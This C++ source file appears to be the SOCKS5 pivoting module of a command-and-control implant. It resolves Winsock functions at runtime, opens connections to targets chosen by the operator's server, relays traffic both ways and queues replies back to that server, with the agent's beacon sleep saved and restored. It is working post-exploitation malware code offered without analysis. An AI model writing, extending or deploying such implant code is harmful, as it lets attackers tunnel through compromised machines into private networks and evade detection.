#include <common.h>
#include <socks.h>
#include <package.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SOCKS

using namespace stardust;
using namespace starburst;

static auto declfn resolve_ws2(
    _Inout_ instance& inst,
    _Out_   SocksState* state
) -> bool {
    state->h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "ws2_32.dll" ) ) );
    if ( !state->h_ws2 ) return false;

    auto gpa = inst.kernel32.GetProcAddress;
    auto h = state->h_ws2;

    state->ws.pWSAStartup     = reinterpret_cast<fn_WSAStartup>( gpa( h, symbol<LPCSTR>( "WSAStartup" ) ) );
    state->ws.psocket          = reinterpret_cast<fn_socket>( gpa( h, symbol<LPCSTR>( "socket" ) ) );
    state->ws.pconnect         = reinterpret_cast<fn_connect>( gpa( h, symbol<LPCSTR>( "connect" ) ) );
    state->ws.psend            = reinterpret_cast<fn_send>( gpa( h, symbol<LPCSTR>( "send" ) ) );
    state->ws.precv            = reinterpret_cast<fn_recv>( gpa( h, symbol<LPCSTR>( "recv" ) ) );
    state->ws.pclosesocket     = reinterpret_cast<fn_closesocket>( gpa( h, symbol<LPCSTR>( "closesocket" ) ) );
    state->ws.pselect          = reinterpret_cast<fn_select>( gpa( h, symbol<LPCSTR>( "select" ) ) );
    state->ws.pioctlsocket     = reinterpret_cast<fn_ioctlsocket>( gpa( h, symbol<LPCSTR>( "ioctlsocket" ) ) );
    state->ws.pgetaddrinfo     = reinterpret_cast<fn_getaddrinfo>( gpa( h, symbol<LPCSTR>( "getaddrinfo" ) ) );
    state->ws.pfreeaddrinfo    = reinterpret_cast<fn_freeaddrinfo>( gpa( h, symbol<LPCSTR>( "freeaddrinfo" ) ) );
    state->ws.pWSAGetLastError = reinterpret_cast<fn_WSAGetLastError>( gpa( h, symbol<LPCSTR>( "WSAGetLastError" ) ) );
    state->ws.pWSACleanup      = reinterpret_cast<fn_WSACleanup>( gpa( h, symbol<LPCSTR>( "WSACleanup" ) ) );
    state->ws.phtons           = reinterpret_cast<fn_htons>( gpa( h, symbol<LPCSTR>( "htons" ) ) );
    state->ws.pntohs           = reinterpret_cast<fn_ntohs>( gpa( h, symbol<LPCSTR>( "ntohs" ) ) );
    state->ws.pinet_addr       = reinterpret_cast<fn_inet_addr>( gpa( h, symbol<LPCSTR>( "inet_addr" ) ) );

    if ( !state->ws.pWSAStartup || !state->ws.psocket || !state->ws.pconnect ||
         !state->ws.psend || !state->ws.precv || !state->ws.pclosesocket ||
         !state->ws.pselect || !state->ws.pioctlsocket ) {
        return false;
    }

    return true;
}

static auto declfn find_connection(
    _In_ SocksState* state,
    _In_ uint32_t    server_id
) -> SocksConnection* {
    for ( uint32_t i = 0; i < state->conn_count; i++ ) {
        if ( state->conns[i].active && state->conns[i].server_id == server_id ) {
            return &state->conns[i];
        }
    }
    return nullptr;
}

static auto declfn alloc_connection(
    _In_ SocksState* state,
    _In_ uint32_t    server_id
) -> SocksConnection* {
    for ( uint32_t i = 0; i < SOCKS_MAX_CONNECTIONS; i++ ) {
        if ( !state->conns[i].active ) {
            state->conns[i].server_id = server_id;
            state->conns[i].sock      = WS_INVALID_SOCKET;
            state->conns[i].active    = true;
            state->conns[i].connected = false;
            if ( i >= state->conn_count ) state->conn_count = i + 1;
            return &state->conns[i];
        }
    }
    return nullptr;
}

static auto declfn close_connection(
    _In_ SocksState* state,
    _In_ SocksConnection* conn
) -> void {
    if ( conn->sock != WS_INVALID_SOCKET ) {
        state->ws.pclosesocket( conn->sock );
        conn->sock = WS_INVALID_SOCKET;
    }
    conn->active    = false;
    conn->connected = false;
}

static auto declfn queue_socks_response(
    _Inout_ instance& inst,
    _In_    uint32_t  server_id,
    _In_    uint8_t*  data,
    _In_    uint32_t  data_len,
    _In_    bool      do_exit
) -> void {
    auto pkg = package_create( inst );
    if ( !pkg ) return;

    package_add_byte( inst, pkg, ACTION_SOCKS_MSG );
    package_add_int32( inst, pkg, server_id );
    package_add_byte( inst, pkg, do_exit ? 1 : 0 );
    package_add_bytes( inst, pkg, data, data_len );

    uint32_t dlen = 0;
    auto ddata = package_build( pkg, &dlen );

    uint32_t needed = inst.response_queue.length + 4 + dlen;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t nc = inst.response_queue.capacity == 0 ? 4096 : inst.response_queue.capacity;
        while ( nc < needed ) nc *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, nc ) );
        inst.response_queue.capacity = nc;
    }
    auto qb = inst.response_queue.buffer + inst.response_queue.length;
    qb[0] = (dlen >> 24) & 0xFF;
    qb[1] = (dlen >> 16) & 0xFF;
    qb[2] = (dlen >> 8)  & 0xFF;
    qb[3] = dlen & 0xFF;
    memory::copy( qb + 4, ddata, dlen );
    inst.response_queue.length += 4 + dlen;

    package_destroy( inst, pkg );
}

static auto declfn socks_connect_target(
    _Inout_ instance& inst,
    _In_    SocksState* state,
    _In_    SocksConnection* conn,
    _In_    uint8_t* data,
    _In_    uint32_t data_len
) -> void {
    // parse SOCKS5 CONNECT request: [VER][CMD][RSV][ATYP][DST.ADDR][DST.PORT]
    if ( data_len < 4 ) {
        uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_FAILURE, 0x00, SOCKS5_ATYP_IPV4,
                            0,0,0,0, 0,0 };
        queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
        close_connection( state, conn );
        return;
    }

    uint8_t atyp = data[3];
    char host[256] = {};
    uint16_t port = 0;
    uint32_t addr_end = 0;

    if ( atyp == SOCKS5_ATYP_IPV4 && data_len >= 10 ) {
        // 4-byte IPv4 address
        char num[4];
        uint32_t off = 0;
        for ( int i = 0; i < 4; i++ ) {
            int_to_str( num, data[4 + i], 10 );
            uint32_t nlen = str_len( num );
            memory::copy( host + off, num, nlen );
            off += nlen;
            if ( i < 3 ) host[off++] = '.';
        }
        host[off] = 0;
        port = ((uint16_t)data[8] << 8) | data[9];
        addr_end = 10;
    } else if ( atyp == SOCKS5_ATYP_FQDN && data_len >= 5 ) {
        uint8_t fqdn_len = data[4];
        if ( data_len < (uint32_t)(5 + fqdn_len + 2) || fqdn_len >= 255 ) {
            uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_FAILURE, 0x00, SOCKS5_ATYP_IPV4,
                                0,0,0,0, 0,0 };
            queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
            close_connection( state, conn );
            return;
        }
        memory::copy( host, data + 5, fqdn_len );
        host[fqdn_len] = 0;
        port = ((uint16_t)data[5 + fqdn_len] << 8) | data[5 + fqdn_len + 1];
        addr_end = 5 + fqdn_len + 2;
    } else if ( atyp == SOCKS5_ATYP_IPV6 && data_len >= 22 ) {
        // IPv6 not fully supported - send failure
        uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_ADDR_NOT_SUPPORTED, 0x00, SOCKS5_ATYP_IPV4,
                            0,0,0,0, 0,0 };
        queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
        close_connection( state, conn );
        return;
    } else {
        uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_FAILURE, 0x00, SOCKS5_ATYP_IPV4,
                            0,0,0,0, 0,0 };
        queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
        close_connection( state, conn );
        return;
    }

    DBG_PRINT( inst, "socks: connect server_id=%u to %s:%u\n", conn->server_id, host, port );

    // resolve hostname
    uint32_t resolved_addr = 0;
    if ( state->ws.pgetaddrinfo && state->ws.pfreeaddrinfo ) {
        char port_str[8] = {};
        int_to_str( port_str, port, 10 );

        ws_addrinfo hints = {};
        hints.ai_family   = WS_AF_INET;
        hints.ai_socktype = WS_SOCK_STREAM;
        hints.ai_protocol = WS_IPPROTO_TCP;

        ws_addrinfo* result = nullptr;
        int ret = state->ws.pgetaddrinfo( host, port_str,
            reinterpret_cast<const void*>( &hints ),
            reinterpret_cast<void**>( &result ) );

        if ( ret == 0 && result ) {
            if ( result->ai_addr ) {
                auto sa = reinterpret_cast<ws_sockaddr_in*>( result->ai_addr );
                resolved_addr = sa->sin_addr;
            }
            state->ws.pfreeaddrinfo( result );
        }
    } else if ( state->ws.pinet_addr ) {
        resolved_addr = state->ws.pinet_addr( host );
    }

    if ( resolved_addr == 0 || resolved_addr == 0xFFFFFFFF ) {
        DBG_PRINT( inst, "socks: DNS resolution failed for %s\n", host );
        uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_HOST_UNREACH, 0x00, SOCKS5_ATYP_IPV4,
                            0,0,0,0, 0,0 };
        queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
        close_connection( state, conn );
        return;
    }

    // create socket
    conn->sock = state->ws.psocket( WS_AF_INET, WS_SOCK_STREAM, WS_IPPROTO_TCP );
    if ( conn->sock == WS_INVALID_SOCKET ) {
        uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_FAILURE, 0x00, SOCKS5_ATYP_IPV4,
                            0,0,0,0, 0,0 };
        queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
        close_connection( state, conn );
        return;
    }

    // set non-blocking
    unsigned long nb = 1;
    state->ws.pioctlsocket( conn->sock, WS_FIONBIO, &nb );

    // connect
    ws_sockaddr_in addr = {};
    addr.sin_family = WS_AF_INET;
    addr.sin_port   = state->ws.phtons ? state->ws.phtons( port )
                    : (uint16_t)( ((port & 0xFF) << 8) | ((port >> 8) & 0xFF) );
    addr.sin_addr   = resolved_addr;

    int ret = state->ws.pconnect( conn->sock,
        reinterpret_cast<const void*>( &addr ), sizeof(addr) );

    if ( ret == WS_SOCKET_ERROR ) {
        int err = state->ws.pWSAGetLastError ? state->ws.pWSAGetLastError() : 0;
        if ( err != WSAEWOULDBLOCK && err != WSAEINPROGRESS ) {
            DBG_PRINT( inst, "socks: connect failed err=%d\n", err );
            uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_REFUSED, 0x00, SOCKS5_ATYP_IPV4,
                                0,0,0,0, 0,0 };
            queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
            close_connection( state, conn );
            return;
        }
    }

    // wait for connect with select (up to 10s)
    ws_fd_set wset = {};
    ws_fd_set eset = {};
    wset.fd_count = 1;
    wset.fd_array[0] = conn->sock;
    eset.fd_count = 1;
    eset.fd_array[0] = conn->sock;

    ws_timeval tv = {};
    tv.tv_sec  = 10;
    tv.tv_usec = 0;

    ret = state->ws.pselect( 0,
        nullptr,
        reinterpret_cast<void*>( &wset ),
        reinterpret_cast<void*>( &eset ),
        reinterpret_cast<const void*>( &tv ) );

    if ( ret <= 0 || eset.fd_count > 0 ) {
        DBG_PRINT( inst, "socks: connect timed out or error\n" );
        uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_HOST_UNREACH, 0x00, SOCKS5_ATYP_IPV4,
                            0,0,0,0, 0,0 };
        queue_socks_response( inst, conn->server_id, reply, sizeof(reply), true );
        close_connection( state, conn );
        return;
    }

    conn->connected = true;
    DBG_PRINT( inst, "socks: connected server_id=%u\n", conn->server_id );

    // send success reply
    uint8_t reply[10] = { SOCKS5_VER, SOCKS5_REP_SUCCESS, 0x00, SOCKS5_ATYP_IPV4 };
    reply[4] = (resolved_addr) & 0xFF;
    reply[5] = (resolved_addr >> 8) & 0xFF;
    reply[6] = (resolved_addr >> 16) & 0xFF;
    reply[7] = (resolved_addr >> 24) & 0xFF;
    reply[8] = (port >> 8) & 0xFF;
    reply[9] = port & 0xFF;
    queue_socks_response( inst, conn->server_id, reply, 10, false );
}

auto declfn starburst::socks_init(
    _Inout_ instance& inst
) -> bool {
    auto state = static_cast<SocksState*>( inst.heap_alloc( sizeof(SocksState) ) );
    if ( !state ) return false;

    memory::zero( state, sizeof(SocksState) );

    if ( !resolve_ws2( inst, state ) ) {
        inst.heap_free( state );
        return false;
    }

    // WSAStartup
    uint8_t wsa_data[512] = {};
    int ret = state->ws.pWSAStartup( 0x0202, wsa_data );
    if ( ret != 0 ) {
        inst.heap_free( state );
        return false;
    }

    state->active       = true;
    state->saved_sleep  = inst.agent.sleep_ms;
    state->conn_count   = 0;
    inst.socks_state    = state;

    return true;
}

auto declfn starburst::socks_destroy(
    _Inout_ instance& inst
) -> void {
    auto state = static_cast<SocksState*>( inst.socks_state );
    if ( !state ) return;

    for ( uint32_t i = 0; i < state->conn_count; i++ ) {
        if ( state->conns[i].active ) {
            close_connection( state, &state->conns[i] );
        }
    }

    if ( state->ws.pWSACleanup ) {
        state->ws.pWSACleanup();
    }

    inst.agent.sleep_ms = state->saved_sleep;
    inst.heap_free( state );
    inst.socks_state = nullptr;
}

auto declfn starburst::socks_route(
    _Inout_ instance& inst,
    _In_    uint32_t server_id,
    _In_    uint8_t* data,
    _In_    uint32_t data_len,
    _In_    bool     do_exit
) -> void {
    auto state = static_cast<SocksState*>( inst.socks_state );
    if ( !state || !state->active ) return;

    auto conn = find_connection( state, server_id );

    if ( do_exit ) {
        if ( conn ) {
            close_connection( state, conn );
            queue_socks_response( inst, server_id, nullptr, 0, true );
        }
        return;
    }

    if ( !conn ) {
        conn = alloc_connection( state, server_id );
        if ( !conn ) {
            uint8_t reply[] = { SOCKS5_VER, SOCKS5_REP_FAILURE, 0x00, SOCKS5_ATYP_IPV4,
                                0,0,0,0, 0,0 };
            queue_socks_response( inst, server_id, reply, sizeof(reply), true );
            return;
        }
        socks_connect_target( inst, state, conn, data, data_len );
        return;
    }

    // forward data to connected socket
    if ( conn->connected && data && data_len > 0 ) {
        uint32_t sent = 0;
        while ( sent < data_len ) {
            int ret = state->ws.psend( conn->sock,
                reinterpret_cast<const char*>( data + sent ),
                data_len - sent, 0 );
            if ( ret > 0 ) {
                sent += ret;
            } else if ( ret == WS_SOCKET_ERROR ) {
                int err = state->ws.pWSAGetLastError ? state->ws.pWSAGetLastError() : 0;
                if ( err == WSAEWOULDBLOCK ) break;
                close_connection( state, conn );
                queue_socks_response( inst, server_id, nullptr, 0, true );
                return;
            } else {
                break;
            }
        }
    }
}

auto declfn starburst::socks_poll(
    _Inout_ instance& inst
) -> void {
    auto state = static_cast<SocksState*>( inst.socks_state );
    if ( !state || !state->active ) return;

    auto recv_buf = static_cast<uint8_t*>( inst.heap_alloc( SOCKS_RECV_BUF_SIZE ) );
    if ( !recv_buf ) return;

    for ( uint32_t i = 0; i < state->conn_count; i++ ) {
        auto& conn = state->conns[i];
        if ( !conn.active || !conn.connected ) continue;

        // check if data available with select (non-blocking)
        ws_fd_set rset = {};
        rset.fd_count = 1;
        rset.fd_array[0] = conn.sock;

        ws_timeval tv = {};
        tv.tv_sec  = 0;
        tv.tv_usec = 0;

        int ret = state->ws.pselect( 0,
            reinterpret_cast<void*>( &rset ),
            nullptr, nullptr,
            reinterpret_cast<const void*>( &tv ) );

        if ( ret <= 0 ) continue;
        if ( rset.fd_count == 0 ) continue;

        int bytes = state->ws.precv( conn.sock,
            reinterpret_cast<char*>( recv_buf ),
            SOCKS_RECV_BUF_SIZE, 0 );

        if ( bytes > 0 ) {
            queue_socks_response( inst, conn.server_id, recv_buf, bytes, false );
        } else if ( bytes == 0 ) {
            // connection closed
            close_connection( state, &conn );
            queue_socks_response( inst, conn.server_id, nullptr, 0, true );
        } else {
            int err = state->ws.pWSAGetLastError ? state->ws.pWSAGetLastError() : 0;
            if ( err != WSAEWOULDBLOCK ) {
                close_connection( state, &conn );
                queue_socks_response( inst, conn.server_id, nullptr, 0, true );
            }
        }
    }

    inst.heap_free( recv_buf );
}

#endif // INCLUDE_CMD_SOCKS
